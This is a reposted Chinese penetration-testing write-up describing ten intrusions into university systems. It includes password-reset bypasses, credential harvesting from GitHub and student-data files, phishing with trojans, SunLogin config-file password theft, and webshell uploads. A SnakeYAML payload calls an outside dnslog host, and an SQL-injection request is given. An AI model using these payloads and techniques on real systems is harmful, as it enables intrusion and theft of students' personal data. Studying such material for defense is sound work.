# 教育行业渗透打点


<!--more-->

> *转载自： [https://forum.butian.net/share/2423](https://forum.butian.net/share/2423)*

1、OA系统密码找回 找回密码 系统使用说明文档中发现登录账号 600030 密码找回，找回方式选择密保问题 问题选择出生地，密保问题答案填写高校所在地 即可修改密码 修改密码，即可以图文信息...

## 1、OA系统密码找回

## 找回密码

系统使用说明文档中发现登录账号 600030

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png)

密码找回，找回方式选择密保问题

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png)

问题选择出生地，密保问题答案填写高校所在地

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png)

即可修改密码

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png)

修改密码，即可以图文信息中心的身份登录OA系统

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png)

在文件中找到1400多名学生的敏感信息文件，其中存在手机号、身份证号、学号，可以组合密码本进行统一身份认证系统的爆破登录，默认密码为身份证后六位

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png)

成功登录一部分账号

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png)

## 登录VPN

进行内网扫描，利用MS17010拿下C段多台主机权限

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png)

## 钓鱼

利用OA系统的通讯功能，散播木马

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png)

获取多台机器权限

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png)

## 2、逻辑漏洞修改密码

## GitHub密码泄漏

GitHub泄漏学号密码

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png)

但账号已被禁用

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png)

## 获取学号手机号

存在注册功能的网站注册用户，然后登录

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png)

通过以下接口获得用户ID /User/GetUserListByKeyWord

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png)

可以通过以下接口遍历用户ID，获取任意用户的姓名 手机号 邮箱等敏感信息

/User/Tip?time61&id=caec35e7-9956-4f68-98bc-e2aee73ebda5&\_=1664438691592

获取多组学号、姓名、手机号

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png)

## 修改密码

点击同意门户的忘记密码功能，输入上面得到的学号

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png)

输入手机号，点击获取验证码并抓包

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png)

记录回包内容

```php
"datas":"{\"sign\":\"407ec6dc275f4766a4525e059a60ca16\"}","code":"0","message":"获取成功"
```

随意输入验证码，点击下一步，并把上面的流量包直接返回

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png)

可以看到页面跳转到了设置密码

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png)

成功更改密码

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png)

79个应用，通过其中一个aspx站SQL注入拿到shell

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png)

## 3、Github泄漏账号密码

## 账号密码

1、GitHub搜索"学校域名" "password" 发现邮箱账号密码

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png)

2、登录邮箱发现手机号身份证号

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png)

## 统一门户

3、手机号加邮箱密码直接登录统一门户

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png)

## 泛微OA

跳转到泛微OA,文件上传GetShell

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png)

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png)

## 4、向日葵密码读取

## heapdump文件泄漏

直接下载heapdump文件

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png)

读取到mssql账号密码

## 向日葵密码读取

成功连接mssql服务器，执行xp\_cmdshell

C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini为向日葵的默认安装配置文件，直接尝试读取

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png)

fastcode将第一位字母去除就为本机识别码，encry\_pwd为加密后的本机验证码

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png)

可以使用GitHub解密项目[https://github.com/wafinfo/Sunflower\_get\_Password](https://github.com/wafinfo/Sunflower_get_Password)进行解密。

解密后成功连接目标主机服务器

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png)

## 5、若依漏洞GetShell

1、某学院首页

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png)

2、/login ，访问后台页面，发现为若依框架，admin/admin@123直接登录后台

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png)

## 定时任务命令执行

以管理员权限登录在定时任务处新增

org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager \[ !!java.net.URLClassLoader \[\[ !!java.net.URL \["ftp://ceshi.bdtmos.dnslog.cn"\] \]\] \]')运行任务

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png)DNSlog平台收到请求

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png)

## shiro 反序列化漏洞

工具直接开扫，成功注入内存马

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png)

连接内存马

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png)

发现历史入侵痕迹，发现fscan黑客漏扫工具

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png)

## SQL注入

sql注入当时也懒得去尝试，估计也是存在的

/system/role/list

/system/role/export

/system/dept/edit

```php
POST /system/role/list HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=e9f143b9-3c3d-4acb-96a4-93c7367a98e9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 75 params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```

## 6、FCKeditor上传文件GetShell

1、扫描目录发现存在FCKeditor目录

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png)

2、直接找到上传目录

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png)

3、上传aspx木马

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png)

成功连接

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png)

## 7、任意文件上传

根据学校名称及域名进行编排密码本，爆破登录admin账号

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png)

上传点任意文件上传GetShell

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png)

## 8、S2反序列化漏洞GetShell

1、目标网站存在S2框架

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png)

2、直接使用工具进行扫描，进而获取权限进行内网渗透

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png)

## 9、逻辑漏洞

## 找回密码

1、某站点找回密码处，短信验证码直接出现在回包中

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png)

2、谷歌语法搜索 "XX大学" "手机号" filetype:xls 找到一些手机号码

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png)

3、找回功能-修改密码-登录系统，发现是一个学校党务的测试系统

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png)

但其中数据是真实的，有上千份姓名、手机号、学号、身份证等信息

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png)

## 统一门户

使用学号加身份证后六位直接登录统一服务平台

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png)

## 10、geoserver弱口令

8085端口geoserver，进入登陆页面，使用默认账号密码admin/geoserver成功登录后台。

![image.png](https://www.bysec.cn/OSS/img/教育行业渗透打点/attach-2b467edae299849fded88fedaab939758dc8bb10.png)

## 获取数据库密码

登录后进入配置页面，点击查看其中的数据存储

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png)

F12查看网页源代码，读取PostgreSQL密码：

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png)

## 撞库

同时发现目标ip还对外开启了mysql数据库，使用root和上文获取到的密码，成功连接上。

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png)

在其中一个log表中发现了账号和MD5加密的密码。

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png)

## GetShell

8888端口后台登录页，使用数据库中获取到的账号密码成功登录后台，发现是个金碟的系统，然后使用了文件上传漏洞，成功getshell（截图和payload有点敏感，就不放了）

![](https://www.bysec.cn/OSS/img/教育行业渗透打点/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png)

## 总结：

对于高校的渗透可以从以下几点入手

1、VPN弱口令，GitHub泄漏是重灾区，可以搜索"学校域名" "password"

2、高校的站点一般比较老旧，aspx的站点比较多，可以多关注一下SQL注入，大多数的后台都存在SQL注入。

3、多扫下目录，有些存在各种编辑器的漏洞，但是一些漏洞可能是伪修复了，比如说ueditor的文件上传，可能只是把参数名更换了，只要找到正确的参数名就可以继续利用。

4、百度谷歌高级搜索学号文件，多收集一些账号，搜集网站的使用说明文件，其中有对密码组成进行说明，如身份证后六位等，针对一些管理员的账号进行密码的编排

5、QQ官方群有一些敏感文件，可以使用上面搜集到的信息混入其中

总结起来就是多信息收集，信息收集yyds
